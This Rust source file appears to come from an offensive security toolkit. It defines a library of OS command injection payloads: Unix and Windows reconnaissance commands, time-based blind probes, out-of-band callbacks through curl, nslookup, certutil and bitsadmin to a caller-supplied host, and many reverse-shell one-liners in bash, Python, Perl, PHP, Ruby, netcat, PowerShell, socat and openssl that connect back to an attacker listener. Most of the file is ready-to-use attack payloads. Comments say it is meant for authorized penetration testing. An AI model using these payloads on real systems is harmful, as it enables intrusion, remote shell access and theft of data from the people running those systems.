// ----------------------------------------------------------------------------
//  command_injection.rs — command injection payloads
// ----------------------------------------------------------------------------
//  Command injection payloads — OS command sequences for RCE testing.
//
//  --- Developers ---------------------------------------------------------------
//  khaninkali             — разработчик / core engineer (Rust backend, logic)
//  Lyara Koroleva         — дизайнер / blazing fast CLI & interface design
//  HsecDevelopers         — 测试 / テスト / testing & QA (integration, validation)
//  projectk 2091         — HyperSecurityOffensiveLabs lineage
// ----------------------------------------------------------------------------
//
//
// ---------------------------------------------------------------------------
//  ⚠ WARNING / 警告 / 警告
// ---------------------------------------------------------------------------
//  This source code is the exclusive property of HyperSecurityOffensiveLabs.
//  You are permitted to VIEW this code for educational and reference
//  purposes only. You may NOT modify, distribute, sublicense, or create
//  derivative works without explicit written permission from khaninkali
//  and the HyperSecurityOffensiveLabs development team.
//
//  このソースコードはHyperSecurityOffensiveLabsの独占的知的財産です。
//  教育目的および参照目的での閲覧のみ許可されています。
//  khaninkaliおよびHyperSecurityOffensiveLabs開発チームの
//  書面による明示的な許可なく、修正、配布、サブライセンス、
//  または二次的著作物の作成を禁止します。
//
//  本源代码是HyperSecurityOffensiveLabs的独家财产。
//  仅允许出于教育和参考目的查看。未经khaninkali和
//  HyperSecurityOffensiveLabs开发团队的书面明确许可，
//  禁止修改、分发、再许可或创建衍生作品。
// ---------------------------------------------------------------------------
//
//

// ◆ CommandInjection: OSコマンドインジェクションペイロード
// ◆ Five categories covering Unix, Windows, blind, OOB, and reverse shell.
// ■ ペイロードカテゴリ:
//   ➊ get_basic_payloads — Unix系基本コマンド (id/whoami/curl/wget)
//   ➋ get_windows_payloads — Windows系コマンド (dir/wmic/reg query)
//   ➌ get_time_based_payloads — 時間ベースブラインド (sleep/ping/timeout)
//   ➍ get_oob_payloads — OOB/DNS/HTTP コールバック (nslookup/curl/dig)
//   ➎ get_reverse_shell_payloads — リバースシェル (bash/python/perl/nc/PS)
// ♢ リスナーIP/ポートは呼び出し元から注入される（ハードコード禁止）
/// Command injection payload library.
///
/// Callback/listener addresses are **never** hardcoded — callers must supply
/// their own listener IP and port so payloads are always scoped to the
/// authorized engagement infrastructure.
pub struct CommandInjection;

impl CommandInjection {
    // ── Detection payloads ────────────────────────────────────────────────────

    // ◆ get_basic_payloads: Unix系基本電脳検出ペイロード
    // ◆ Basic Unix command execution — semicolon, pipe, backtick, $() injection.
    // ■ インジェクション手法:
    //   ; | ` $() && || — 各デリミタでコマンド分離をテスト
    // ■ 電脳検出コマンド: id, whoami, uname, cat /etc/passwd, ls, curl, wget
    // ♢ 空白不使用 variant: ${IFS} でフィルター回避
    /// Basic output-based detection payloads (Unix).
    pub fn get_basic_payloads() -> Vec<String> {
        vec![
            "; id".to_string(),
            "| id".to_string(),
            "` id`".to_string(),
            "$(id)".to_string(),
            "&& id".to_string(),
            "|| id".to_string(),
            "; whoami".to_string(),
            "; uname -a".to_string(),
            "; cat /etc/passwd".to_string(),
            "; ls -la /".to_string(),
            "; pwd".to_string(),
            "; env".to_string(),
            "; ps aux".to_string(),
            "; hostname".to_string(),
            "; ip addr show".to_string(),
            "; curl http://127.0.0.1:8080/".to_string(),
            "; wget http://127.0.0.1:8080/ -O /dev/null".to_string(),
            // No-space variants
            "$(cat${IFS}/etc/passwd)".to_string(),
            "$(ls${IFS}-la)".to_string(),
        ]
    }

    // ◆ get_windows_payloads: Windows専用電脳検出ペイロード
    // ◆ Windows command execution via & | ; delimiters.
    // ■ ターゲットコマンド:
    //   dir, whoami, net user, ipconfig, systeminfo, tasklist
    //   wmic, reg query, type (ファイル読み取り)
    /// Windows-specific detection payloads.
    pub fn get_windows_payloads() -> Vec<String> {
        vec![
            "& dir".to_string(),
            "| dir".to_string(),
            "; dir".to_string(),
            "& whoami".to_string(),
            "& net user".to_string(),
            "& net localgroup Administrators".to_string(),
            "& net group \"Domain Admins\" /domain".to_string(),
            "& ipconfig /all".to_string(),
            "& systeminfo".to_string(),
            "& type C:\\windows\\win.ini".to_string(),
            "& echo %USERNAME%".to_string(),
            "& echo %COMPUTERNAME%".to_string(),
            "& echo %USERDOMAIN%".to_string(),
            "& tasklist".to_string(),
            "& wmic os get Caption".to_string(),
            "& wmic qfe get Caption,Description,HotFixID,InstalledOn".to_string(),
            "& wmic product get name,version".to_string(),
            "& reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run".to_string(),
            "& reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run".to_string(),
            "& dir C:\\Users\\".to_string(),
            "& dir C:\\inetpub\\wwwroot\\".to_string(),
        ]
    }

    // ◆ get_time_based_payloads: 時間ベースブラインド電脳検出
    // ◆ Blind detection via sleep/ping/timeout — no output needed, only timing.
    // ■ Unix: sleep 5/3, ping -c 5/10
    // ■ Windows: timeout /t 5, ping -n 5, powershell Start-Sleep
    // ♢ 応答時間の差でインジェクション成功を判定
    /// Time-based blind detection payloads (no output required).
    pub fn get_time_based_payloads() -> Vec<String> {
        vec![
            "; sleep 5".to_string(),
            "| sleep 5".to_string(),
            "&& sleep 5".to_string(),
            "`sleep 5`".to_string(),
            "$(sleep 5)".to_string(),
            "& sleep 5".to_string(),
            "|| sleep 5".to_string(),
            "; sleep 3".to_string(),
            "| sleep 3".to_string(),
            "$(sleep 3)".to_string(),
            "; ping -c 5 127.0.0.1".to_string(),
            "| ping -c 5 127.0.0.1".to_string(),
            "&& ping -c 5 127.0.0.1".to_string(),
            "; ping -c 10 127.0.0.1".to_string(),
            // Windows
            "& timeout /t 5 /nobreak".to_string(),
            "& ping -n 5 127.0.0.1".to_string(),
            "& ping -n 10 127.0.0.1".to_string(),
            "& powershell -c \"Start-Sleep -s 5\"".to_string(),
        ]
    }

    // ── OOB / blind payloads (require caller-supplied callback host) ──────────

    // ◆ get_oob_payloads: OOB/DNS/HTTPコールバックペイロード
    // ◆ Out-of-band exfiltration via nslookup, curl, wget, ping, host, dig, nc.
    // ■ Windows OOB: certutil, bitsadmin, powershell Invoke-WebRequest
    // ♢ callback_hostはコラボレータ/インタラクトシュインスタンス
    // ★ ファイアウォールでHTTP(S)がブロックされていてもDNSで電脳検出可能
    /// Out-of-band DNS/HTTP payloads for blind command injection.
    /// `callback_host` should be your Burp Collaborator / interactsh instance.
    pub fn get_oob_payloads(callback_host: &str) -> Vec<String> {
        vec![
            format!("; nslookup {}", callback_host),
            format!("| nslookup {}", callback_host),
            format!("`nslookup {}`", callback_host),
            format!("$(nslookup {})", callback_host),
            format!("; curl http://{}/ci", callback_host),
            format!("| curl http://{}/ci", callback_host),
            format!("; wget -q http://{}/ci -O /dev/null", callback_host),
            format!("; ping -c 1 {}", callback_host),
            format!("; host -t a {}", callback_host),
            format!("; dig {} @8.8.8.8", callback_host),
            format!("; nc -v {} 80", callback_host),
            // Windows
            format!("& nslookup {}", callback_host),
            format!("& curl http://{}/ci", callback_host),
            format!("& powershell -c \"Invoke-WebRequest http://{}/ci\"", callback_host),
            format!("& powershell -c \"Resolve-DnsName {}\"", callback_host),
            format!("& certutil -urlcache -f http://{}/ci %temp%\\test.txt", callback_host),
            format!("& bitsadmin /transfer job /download /priority high http://{}/ci C:\\out.txt", callback_host),
        ]
    }

    // ── Post-exploitation / reverse shells (require caller-supplied listener) ─

    // ◆ get_reverse_shell_payloads: リバースシェルワンライナー
    // ◆ Multi-language reverse shell one-liners for post-exploitation.
    // ■ Languages/Tools:
    //   bash TCP/UDP, python2/3, perl, php, ruby, nc/ncat, socat, telnet
    //   gost, openssl, powershell (TCP client with interactive shell)
    // ♢ すべてのペイロードにlistener_ip:listener_portを埋め込む
    // ★ ターゲット環境に応じて使用可能な言語を選択
    /// Reverse shell one-liners.
    /// `listener_ip` and `listener_port` must be the attacker-controlled listener
    /// on the authorized engagement network.
    pub fn get_reverse_shell_payloads(listener_ip: &str, listener_port: u16) -> Vec<String> {
        vec![
            // Bash TCP
            format!("bash -i >& /dev/tcp/{}/{} 0>&1", listener_ip, listener_port),
            format!("/bin/bash -i >& /dev/tcp/{}/{} 0>&1", listener_ip, listener_port),
            format!("exec bash -i &>/dev/tcp/{}/{} <&1", listener_ip, listener_port),
            // Bash UDP
            format!("bash -i >& /dev/udp/{}/{} 0>&1", listener_ip, listener_port),
            // Python 3
            format!(
                "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{}\",{}));\
                [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
                listener_ip, listener_port
            ),
            // Python 2
            format!(
                "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{}\",{}));\
                [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
                listener_ip, listener_port
            ),
            // Python short
            format!("python -c \"exec(\\\"import socket, subprocess;s=socket.socket();s.connect(('{}',{}));subprocess.call(['/bin/sh','-i'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\\\")\"", listener_ip, listener_port),
            // Perl
            format!(
                "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\
                if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");\
                open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                listener_ip, listener_port
            ),
            // PHP
            format!(
                "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                listener_ip, listener_port
            ),
            format!(
                "php -r 'system(\"bash -i >& /dev/tcp/{}/{} 0>&1\");'",
                listener_ip, listener_port
            ),
            // Ruby
            format!(
                "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;\
                exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                listener_ip, listener_port
            ),
            // Netcat with -e
            format!("nc -e /bin/sh {} {}", listener_ip, listener_port),
            format!("nc -e /bin/bash {} {}", listener_ip, listener_port),
            format!("ncat -e /bin/sh {} {}", listener_ip, listener_port),
            // Netcat without -e (mkfifo)
            format!(
                "rm -f /tmp/.ox;mkfifo /tmp/.ox;cat /tmp/.ox|/bin/sh -i 2>&1|nc {} {} >/tmp/.ox",
                listener_ip, listener_port
            ),
            format!(
                "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f",
                listener_ip, listener_port
            ),
            // PowerShell
            format!(
                "powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{}',{});\
                $s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};\
                while(($i=$s.Read($b,0,$b.Length)) -ne 0){{\
                $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);\
                $r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';\
                $x=([text.encoding]::ASCII).GetBytes($r2);$s.Write($x,0,$x.Length);$s.Flush()}}\"",
                listener_ip, listener_port
            ),
            format!(
                "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{}',{});\
                $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};\
                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{\
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\
                $sendback = (iex $data 2>&1 | Out-String );\
                $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\
                $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
                listener_ip, listener_port
            ),
            // Socat
            format!(
                "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}",
                listener_ip, listener_port
            ),
            format!("socat tcp-connect:{}:{} exec:/bin/sh,pty,stderr,setsid,sigint,sane", listener_ip, listener_port),
            // Telnet
            format!("rm -f /tmp/.ox;mkfifo /tmp/.ox;cat /tmp/.ox|/bin/sh -i 2>&1|telnet {} {} >/tmp/.ox", listener_ip, listener_port),
            // GOST
            format!("gost -L tcp://{}/{} -F tcp://:{}::{}", listener_ip, listener_port, listener_port, listener_ip),
            // Openssl
            format!("mkfifo /tmp/.ox;cat /tmp/.ox|/bin/sh -i 2>&1|openssl s_client -quiet -connect {}:{} >/tmp/.ox", listener_ip, listener_port),
        ]
    }

}
